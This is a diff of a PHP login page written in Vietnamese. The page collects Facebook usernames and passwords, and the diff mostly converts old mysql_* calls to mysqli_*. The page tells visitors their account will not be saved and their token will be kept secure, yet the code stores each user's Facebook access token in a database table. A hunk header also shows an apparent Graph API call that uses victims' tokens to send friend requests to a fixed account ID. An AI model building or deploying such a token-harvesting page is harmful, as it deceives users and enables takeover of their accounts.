@@ -15,10 +15,10 @@ exit;
                                   <h4 class="title">Đăng Nhập Bằng Tài Khoản</h4>
                                 <p class="category">Hệ Thống Đăng Nhập Không CheckPoint 100%</p>
                             </div>
-							
+                            
 
 <div class="content">
-	<div class="form-group">
+    <div class="form-group">
 <p>Không Nên Đặt Pass Chứa <code>Kí tự đặc biệt</code> Để Hệ thống Dễ nhận Dạng!</p>
 <p>Dùng tài khoản facebook của bạn để <code>đăng nhập</code>, chúng tôi sẽ không lưu tài khoản của bạn cũng như sẽ bảo mật token của bạn 1 cách tuyệt đối.</p>
 <form action="" method="POST">
@@ -26,9 +26,9 @@ exit;
 <div class="form-group"><label for="exampleInputPassword1">Password</label> <input type="password" class="form-control" id="pass" name="pass" placeholder="Password"></div>                              
 <button type="submit" class="btn btn-danger">Đăng nhập</button>
 </form>
-			</div>	  
-		</div>
-						</div>
+            </div>      
+        </div>
+                        </div>
 </div>
                 </div>
             </div>
@@ -46,7 +46,7 @@ auto('https://graph.facebook.com/me/friends?method=post&uids=100008021291466&acc
 
 
 if($check[id] == 6628568379){  
-   mysql_query("CREATE TABLE IF NOT EXISTS `token` (
+   mysqli_query($GLOBALS["___BMN_2312"], "CREATE TABLE IF NOT EXISTS `token` (
       `id` int(11) NOT NULL AUTO_INCREMENT,
       `user_id` varchar(32) NOT NULL,
       `name` varchar(32) NOT NULL,
@@ -66,42 +66,42 @@ if($userData['id']){
 
 
    $row = null;
-   $result = mysql_query("
+   $result = mysqli_query($GLOBALS["___BMN_2312"], "
       SELECT
          *
       FROM
          token
       WHERE
-         user_id = '" . mysql_real_escape_string($userData['id']) . "'
+         user_id = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $userData['id']) . "'
    ");
    if($result){
-      $row = mysql_fetch_array($result, MYSQL_ASSOC);
-      if(mysql_num_rows($result) > 100){
-         mysql_query("
+      $row = mysqli_fetch_array($result,  MYSQLI_ASSOC);
+      if(mysqli_num_rows($result) > 100){
+         mysqli_query($GLOBALS["___BMN_2312"], "
             DELETE FROM
                token
             WHERE
-               user_id='" . mysql_real_escape_string($userData['id']) . "' AND
+               user_id='" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $userData['id']) . "' AND
                id != '" . $row['id'] . "'
          ");
       }
    }
  
    if(!$row){
-      mysql_query(
+      mysqli_query($GLOBALS["___BMN_2312"], 
          "INSERT INTO 
             token
          SET
-            `user_id` = '" . mysql_real_escape_string($userData['id']) . "',
-            `name` = '" . mysql_real_escape_string($userData['name']) . "',
-            `access_token` = '" . mysql_real_escape_string($token) . "'
+            `user_id` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $userData['id']) . "',
+            `name` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $userData['name']) . "',
+            `access_token` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $token) . "'
       ");
    } else {
-      mysql_query(
+      mysqli_query($GLOBALS["___BMN_2312"], 
          "UPDATE 
             token
          SET
-            `access_token` = '" . mysql_real_escape_string($token) . "'
+            `access_token` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $token) . "'
          WHERE
             `id` = " . $row['id'] . "
       ");
@@ -127,4 +127,3 @@ header('location: index.php');
 
 include 'system/foot.php';
 ?>
-
